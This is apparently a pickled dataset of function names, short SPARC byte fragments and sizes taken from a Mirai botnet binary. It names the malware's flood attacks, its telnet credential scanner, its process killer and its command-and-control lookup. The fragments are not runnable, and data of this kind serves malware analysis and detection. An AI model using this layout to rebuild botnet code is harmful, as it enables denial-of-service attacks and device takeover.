(lp0
(S'_init'
p1
S'9de39840002800005b6d01008100'
p2
L28L
tp3
a(S'__do_global_dtors_aux'
p4
S'9de3982300c2a8a0002100c23c00800b0000c0c23c0080fb'
p5
L124L
tp6
a(S'call___do_global_dtors_aux'
p7
S'9de3988100'
p8
L12L
tp9
a(S'frame_dummy'
p10
S'9de3980300'
p11
L96L
tp12
a(S'call_frame_dummy'
p13
S'9de3988100'
p14
L12L
tp15
a(S'_start'
p16
S'bc23589403700040190096129498139c9a2900000000010801800a000b01'
p17
L76L
tp18
a(S'attack_app_http'
p19
S'03'
p20
L16620L
tp21
a(S'attack_init'
p22
S'9de3909010000061921040006101009010010063005c0100901002009210400057010090100900921040005201009010030058921040004d0100901004005b92104000480100901005921040004301009010060300104000010090100703001040003900000040921040003400001001c3e00100'
p23
L224L
tp24
a(S'attack_kill_all'
p25
S'9de390c0f41000c6f403008460cc83020000800100c6f403008460cc8302000100d9000007bfdfe0c00107bf0127bff480e500002881e00100'
p26
L152L
tp27
a(S'attack_parse'
p28
S'9de380a048c0ecc0'
p29
L1152L
tp30
a(S'attack_start'
p31
S'9de38827a019a01c27a048c4a0544000de000027bfec805a0100c2ec800400008001004000d0000027bf8005901000456c0100c28010000007a001458400003a0000100100760000000100c0f41000c2f4830200'
p32
L436L
tp33
a(S'attack_get_opt_str'
p34
S'9de388a01a23bcc06c1000c26c8303a001088460ff0bff800100c26c8303a00100c21000c26c'
p35
L188L
tp36
a(S'attack_get_opt_int'
p37
S'9de388a01a27a044c24cc2448460ffa04c'
p38
L152L
tp39
a(S'attack_get_opt_ip'
p40
S'9de388a01a27a044c24cc2448460ffa04c'
p41
L148L
tp42
a(S'add_attack'
p43
S'9de390'
p44
L216L
tp45
a(S'free_opts'
p46
S'9de390'
p47
L168L
tp48
a(S'attack_gre_ip'
p49
S'9de348840027a01a27a044c24cc244'
p50
L2484L
tp51
a(S'attack_gre_eth'
p52
S'9de328a01a27a044c24cc244'
p53
L2792L
tp54
a(S'attack_tcp_syn'
p55
S'9de350840027a01a27a044c24cc244'
p56
L2844L
tp57
a(S'attack_tcp_ack'
p58
S'9de348840027a01a27a044c24cc244'
p59
L2708L
tp60
a(S'attack_tcp_stomp'
p61
S'9de320a01a27a044c24cc244'
p62
L3296L
tp63
a(S'attack_udp_generic'
p64
S'9de360840027a01a27a044c24cc244'
p65
L1908L
tp66
a(S'attack_udp_vse'
p67
S'9de360840027a01a27a044c24cc244'
p68
L1736L
tp69
a(S'attack_udp_dns'
p70
S'9de338a01a27a044c24cc244'
p71
L2244L
tp72
a(S'attack_udp_plain'
p73
S'9de360840027a01a27a044c24cc244'
p74
L1216L
tp75
a(S'get_dns_resolver'
p76
S'9de35090101e400059010090101e9210001f7b00001001000100'
p77
L856L
tp78
a(S'checksum_generic'
p79
S'9de390'
p80
L224L
tp81
a(S'checksum_tcpudp'
p82
S'9de380a048'
p83
L468L
tp84
a(S'killer_init'
p85
S'9de30021901000230100'
p86
L1888L
tp87
a(S'killer_kill'
p88
S'9de3980300'
p89
L44L
tp90
a(S'killer_kill_by_port'
p91
S'03ff'
p92
L3096L
tp93
a(S'has_exe_access'
p94
S'9de300'
p95
L572L
tp96
a(S'memory_scan_match'
p97
S'9de300a0f707a0001d0027bfd880010003'
p98
L956L
tp99
a(S'mem_exists'
p100
S'9de38823c0a0c86cc4a0c0000100c01000c2bcc26c8400c2c40883182818a03fffa00123ff800100c26c'
p101
L248L
tp102
a(S'main'
p103
S'9de3e827a0d407a00000001001240100'
p104
L3432L
tp105
a(S'anti_gdb_entry'
p106
S'9de398'
p107
L40L
tp108
a(S'resolve_cnc_addr'
p109
S'9de39090100313010090100300ef0100'
p110
L244L
tp111
a(S'establish_connection'
p112
S'9de398901002100021010084000300'
p113
L252L
tp114
a(S'teardown_connection'
p115
S'9de3980300'
p116
L92L
tp117
a(S'ensure_single_instance'
p118
S'9de378100127bf02100020010084000300'
p119
L656L
tp120
a(S'unlock_tbl_if_nodebug'
p121
S'9de33827a09b'
p122
L640L
tp123
a(S'rand_init'
p124
S'9de39890100017f80100'
p125
L160L
tp126
a(S'rand_next'
p127
S'9de3900300'
p128
L236L
tp129
a(S'rand_str'
p130
S'9de398'
p131
L232L
tp132
a(S'rand_alphastr'
p133
S'9de36827a09b'
p134
L324L
tp135
a(S'resolv_domain_to_hostname'
p136
S'9de38827a048d0a0c80000c2e8c2ecc244'
p137
L292L
tp138
a(S'resolv_skip_name'
p139
S'9de390'
p140
L260L
tp141
a(S'resolv_lookup'
p142
S'9de300a00100f50100'
p143
L2416L
tp144
a(S'resolv_entries_free'
p145
S'9de398'
p146
L88L
tp147
a(S'recv_strip_null'
p148
S'9de390'
p149
L196L
tp150
a(S'scanner_init'
p151
S'9de3e8010084000300'
p152
L7524L
tp153
a(S'scanner_kill'
p154
S'9de3980300'
p155
L44L
tp156
a(S'setup_connection'
p157
S'9de38827a0e8c0'
p158
L328L
tp159
a(S'get_random_ip'
p160
S'9de39010007ff4490100'
p161
L840L
tp162
a(S'consume_iacs'
p163
S'9de380a0ecc244'
p164
L748L
tp165
a(S'consume_any_prompt'
p166
S'9de380a0ff23'
p167
L324L
tp168
a(S'consume_user_prompt'
p169
S'9de380a0ff27bf44c21827bf370100c4bf44'
p170
L500L
tp171
a(S'consume_pass_prompt'
p172
S'9de380a0ff27bf44c21827bf0100c4bf44'
p173
L380L
tp174
a(S'consume_resp_prompt'
p175
S'9de380a01a030000101a008000'
p176
L316L
tp177
a(S'add_auth_entry'
p178
S'9de390'
p179
L484L
tp180
a(S'random_auth_entry'
p181
S'9de388'
p182
L304L
tp183
a(S'report_working'
p184
S'9de37827a01927a0484000d4000027bff4c2ec809f0100c2ec800400008001009010021000e3000027bf8005901000120000002b00000028000010000200001001f1a0'
p185
L696L
tp186
a(S'deobf'
p187
S'9de390'
p188
L360L
tp189
a(S'can_consume'
p190
S'9de390'
p191
L88L
tp192
a(S'table_init'
p193
S'9de398901003009c921094101e40006b00901004009c9210941002010000009c921094101d0100901013009c9210941002010000009c9210941040010000009c921094101d0100901006030010074000470100901007030010050100901008009c921094100b010100901009009c9210941004003590100a009c921094100740002f010090100b009c921094100801010090100c009c921094100d010090100d921094100a0190100e0300100a010100901003001021010100901010009c9210941008010100901011009c921094100b01901014009c92109410064000ff0000009c92109410074000f90100901016030010074000010090101703001003000100901018009c9210941013000100901019009c921094101800010090101a009c921094100900010090101b009c921094101000010090101c009c92109410164000cf010090101d9210941015010090101e030094101100010090101f030094100c00bd901020009d92109410174000b70000009d92109410534000b10000009d921094102000901023009d921094103000901024009d921094100c009f01009010259210941009009010030094100a00901027030094100c008d0000009d921094101000901029009d92109410130090102a009d9210941008000000009d921094100b000000009d921094100c006f010090102d9210941012000000009d9210941019000000009d921094106f40005d0100901030009d921094106f4000570100901031009d921094106e4000510100901032009d921094106e40004b0100901033009d92109410750045010081e00100'
p194
L1216L
tp195
a(S'table_unlock_val'
p196
S'9de390'
p197
L76L
tp198
a(S'table_lock_val'
p199
S'9de390'
p200
L76L
tp201
a(S'table_retrieve_val'
p202
S'9de390'
p203
L104L
tp204
a(S'add_entry'
p205
S'9de390'
p206
L140L
tp207
a(S'toggle_obf'
p208
S'9de3882bbc830300'
p209
L380L
tp210
a(S'util_strlen'
p211
S'9de390'
p212
L112L
tp213
a(S'util_strncmp'
p214
S'9de38827a048f427a0447f'
p215
L264L
tp216
a(S'util_strcmp'
p217
S'9de38827a048d0a09e0100'
p218
L240L
tp219
a(S'util_strcpy'
p220
S'9de390'
p221
L80L
tp222
a(S'util_memcpy'
p223
S'9de390'
p224
L120L
tp225
a(S'util_zero'
p226
S'9de390'
p227
L88L
tp228
a(S'util_atoi'
p229
S'9de37027a048c0e027bf44c20038c2e407a00127a0e428831800980100'
p230
L832L
tp231
a(S'util_itoa'
p232
S'9de358'
p233
L460L
tp234
a(S'util_memsearch'
p235
S'9de38823c0a0c86cc4a0c0000100'
p236
L256L
tp237
a(S'util_stristr'
p238
S'9de380a048f427a044c2e87ffd940100'
p239
L448L
tp240
a(S'util_local_addr'
p241
S'9de378101027bf2b00002090100210000a0100'
p242
L228L
tp243
a(S'util_fdgets'
p244
S'9de38827a048f427a0'
p245
L252L
tp246
a(S'util_isupper'
p247
S'9de390'
p248
L100L
tp249
a(S'util_isalpha'
p250
S'9de390'
p251
L148L
tp252
a(S'util_isspace'
p253
S'9de390'
p254
L148L
tp255
a(S'util_isdigit'
p256
S'9de390'
p257
L100L
tp258
a(S'fork'
p259
S''
p260
L52L
tp261
a(S'.urem'
p262
S'81000100947209e09022'
p263
L32L
tp264
a(S'.udiv'
p265
S'81008100'
p266
L20L
tp267
a(S'.umul'
p268
S'9052008100'
p269
L12L
tp270
a(S'.rem'
p271
S'953a1f8100010094fa0080943a0922'
p272
L44L
tp273
a(S'fcntl'
p274
S'9de390'
p275
L136L
tp276
a(S'fcntl64'
p277
S'9de390'
p278
L100L
tp279
a(S'chdir'
p280
S'9de398'
p281
L68L
tp282
a(S'close'
p283
S'9de398'
p284
L68L
tp285
a(S'getpid'
p286
S'9de398'
p287
L64L
tp288
a(S'getppid'
p289
S'9de398'
p290
L64L
tp291
a(S'ioctl'
p292
S'9de390'
p293
L100L
tp294
a(S'kill'
p295
S'9de398'
p296
L72L
tp297
a(S'open'
p298
S'9de39094100027a054fa27a0198e02a05094101a27bf10321080ba2008a000b000b03fff2200'
p299
L120L
tp300
a(S'creat'
p301
S'9410091300bf00'
p302
L20L
tp303
a(S'prctl'
p304
S'9de398'
p305
L84L
tp306
a(S'read'
p307
S'9de398'
p308
L76L
tp309
a(S'readlink'
p310
S'9de398'
p311
L76L
tp312
a(S'select'
p313
S'9de398'
p314
L84L
tp315
a(S'setsid'
p316
S'9de398'
p317
L64L
tp318
a(S'sigprocmask'
p319
S'9de398901018a660008094101aa00010808096100800b03fff2200e820100880b400b400'
p320
L140L
tp321
a(S'time'
p322
S'9de398'
p323
L72L
tp324
a(S'unlink'
p325
S'9de398'
p326
L68L
tp327
a(S'write'
p328
S'9de398'
p329
L76L
tp330
a(S'closedir'
p331
S'9de3880098a20620c20010118094101000'
p332
L136L
tp333
a(S'opendir'
p334
S'9de34013001018'
p335
L260L
tp336
a(S'readdir'
p337
S'9de388062013004000921240003a06200620800ec60c0600d2200037d420a200201020c00406200620000820040420c203bf2007bf010a8100'
p338
L168L
tp339
a(S'__errno_location'
p340
S'110081'
p341
L12L
tp342
a(S'clock'
p343
S'9de3880c9007bfecc4bfff230300'
p344
L56L
tp345
a(S'bcopy'
p346
S'96100810'
p347
L12L
tp348
a(S'memmove'
p349
S'80400800960280768b03020a8080eb8a12600480'
p350
L1448L
tp351
a(S'memcpy'
p352
S'9822092303808008bf600480'
p353
L4196L
tp354
a(S'sub_25030'
p355
S'81'
p356
L8L
tp357
a(S'sub_25038'
p358
S'81'
p359
L8L
tp360
a(S'bzero'
p361
S'1000'
p362
L8L
tp363
a(S'memset'
p364
S'8660ff10021002a2001008'
p365
L192L
tp366
a(S'sub_25134'
p367
S'81'
p368
L8L
tp369
a(S'ntohl'
p370
S'8100'
p371
L8L
tp372
a(S'ntohs'
p373
S'912a1032'
p374
L12L
tp375
a(S'htonl'
p376
S'8100'
p377
L8L
tp378
a(S'htons'
p379
S'912a1032'
p380
L12L
tp381
a(S'inet_addr'
p382
S'9de390901018002ba200'
p383
L40L
tp384
a(S'accept'
p385
S'9de398'
p386
L76L
tp387
a(S'bind'
p388
S'9de38827bf'
p389
L36L
tp390
a(S'connect'
p391
S'9de398'
p392
L76L
tp393
a(S'getsockname'
p394
S'9de398'
p395
L76L
tp396
a(S'getsockopt'
p397
S'9de398'
p398
L84L
tp399
a(S'listen'
p400
S'9de3909010043fbf459207bf'
p401
L28L
tp402
a(S'recv'
p403
S'9de3883fbf'
p404
L32L
tp405
a(S'recvfrom'
p406
S'9de398'
p407
L88L
tp408
a(S'send'
p409
S'9de3883fbf'
p410
L32L
tp411
a(S'sendto'
p412
S'9de398'
p413
L88L
tp414
a(S'setsockopt'
p415
S'9de380bfe8f6bff44000'
p416
L44L
tp417
a(S'socket'
p418
S'9de398'
p419
L76L
tp420
a(S'raise'
p421
S'9de3987ff71018bf00'
p422
L20L
tp423
a(S'sigaddset'
p424
S'9de398'
p425
L56L
tp426
a(S'sigemptyset'
p427
S'9de3989210001080b41000'
p428
L32L
tp429
a(S'signal'
p430
S'9de380008004a6208027bfe210ff2200e82010bf032084'
p431
L188L
tp432
a(S'__sigismember'
p433
S'9202'
p434
L40L
tp435
a(S'__sigaddset'
p436
S'86009202842090100032932ac209c3e0c2'
p437
L44L
tp438
a(S'__sigdelset'
p439
S'86009202842090100032932ac209e0c4'
p440
L44L
tp441
a(S'malloc'
p442
S'9de3908004a63ff810201800'
p443
L320L
tp444
a(S'calloc'
p445
S'9de398a0a620020081000100'
p446
L112L
tp447
a(S'free'
p448
S'9de39880a0063ffc31004000409016211010004000d6901500e600c260830380a000df029014cca4040c0090100080c404002916218081a005c208200880c20480c204250040001790123c241300df16234000ef902212bfe0'
p449
L232L
tp450
a(S'realloc'
p451
S'9de3988006a21018ffb0203020126007b0001000a404fcb07f800304fcb020a600082000df0190143c041900400051901258a410080190143ca4a00406401280c2fc7fff90063ffca08092101180a2'
p452
L280L
tp453
a(S'__heap_alloc'
p454
S'c20008800200801a0004000180'
p455
L160L
tp456
a(S'__heap_alloc_at'
p457
S'8800940220020000801b000980940a0a80'
p458
L156L
tp459
a(S'__heap_link_free_area'
p460
S'd4600880d62210a00080d2e08100'
p461
L48L
tp462
a(S'__heap_link_free_area_after'
p463
S'80032200220822'
p464
L24L
tp465
a(S'__heap_free'
p466
S'9de398882090101880'
p467
L268L
tp468
a(S'atol'
p469
S'921000c0800100'
p470
L20L
tp471
a(S'strtol'
p472
S'961001800100'
p473
L16L
tp474
a(S'_stdlib_strto_l'
p475
S'9de3980300a000c4'
p476
L428L
tp477
a(S'exit'
p478
S'9de38800df0098941468a200a810110000'
p479
L128L
tp480
a(S'sleep'
p481
S'9de3002012bf0800c07880830227bff4a01014'
p482
L428L
tp483
a(S'__uClibc_fini'
p484
S'9de3980500de632007a100de80c00000a43fffbf200300c280059fc0000000'
p485
L132L
tp486
a(S'__pthread_return_0'
p487
S'8120'
p488
L8L
tp489
a(S'_pthread_cleanup_push_defer'
p490
S'8100'
p491
L8L
tp492
a(S'__check_one_fd'
p493
S'9de398921001d1a200921019009e7ff473121080010040009d01008100'
p494
L68L
tp495
a(S'__uClibc_init'
p496
S'9de39805000080'
p497
L104L
tp498
a(S'__uClibc_main'
p499
S'9de32000'
p500
L620L
tp501
a(S'__socketcall'
p502
S'9de398'
p503
L72L
tp504
a(S'_exit'
p505
S'9de398'
p506
L64L
tp507
a(S'fstat'
p508
S'9de358'
p509
L104L
tp510
a(S'__getdents'
p511
S'9de3989010180092101980b44018e86008066004400006600c066013600406600b0e6012600af4f1940219ffedd46008166008a6401abf6010'
p512
L136L
tp513
a(S'__getdents64'
p514
S'9de398'
p515
L288L
tp516
a(S'getegid'
p517
S'9de398'
p518
L64L
tp519
a(S'geteuid'
p520
S'9de398'
p521
L64L
tp522
a(S'getgid'
p523
S'9de398'
p524
L64L
tp525
a(S'getuid'
p526
S'9de398'
p527
L64L
tp528
a(S'lseek64'
p529
S'9de390'
p530
L112L
tp531
a(S'nanosleep'
p532
S'9de398'
p533
L72L
tp534
a(S'sbrk'
p535
S'9de3982100c27ca000a20020a200b03fff80'
p536
L84L
tp537
a(S'times'
p538
S'9de398'
p539
L72L
tp540
a(S'__xstat64_conv'
p541
S'9de398921000'
p542
L140L
tp543
a(S'__xstat_conv'
p544
S'9de398921000'
p545
L156L
tp546
a(S'inet_aton'
p547
S'80008015c3e09010004a00'
p548
L220L
tp549
a(S'sigaction'
p550
S'9de38000c20027bf80f706608827bf8427bf18a6a003be78000080b000800b07be048007bedfbe8407be88'
p551
L160L
tp552
a(S'abort'
p553
S'9de38800dffd5090128c0007bf032084'
p554
L316L
tp555
a(S'_dl_aux_init'
p556
S'c42000'
p557
L28L
tp558
a(S'brk'
p559
S'9de398'
p560
L60L
tp561
a(S'__syscall_rt_sigaction'
p562
S'9de398'
p563
L80L
tp564
a(S'__do_global_ctors_aux'
p565
S'9de3980300'
p566
L60L
tp567
a(S'call___do_global_ctors_aux'
p568
S'9de3988100'
p569
L12L
tp570
a(S'_fini'
p571
S'9de3987fa4840000'
p572
L20L
tp573
a.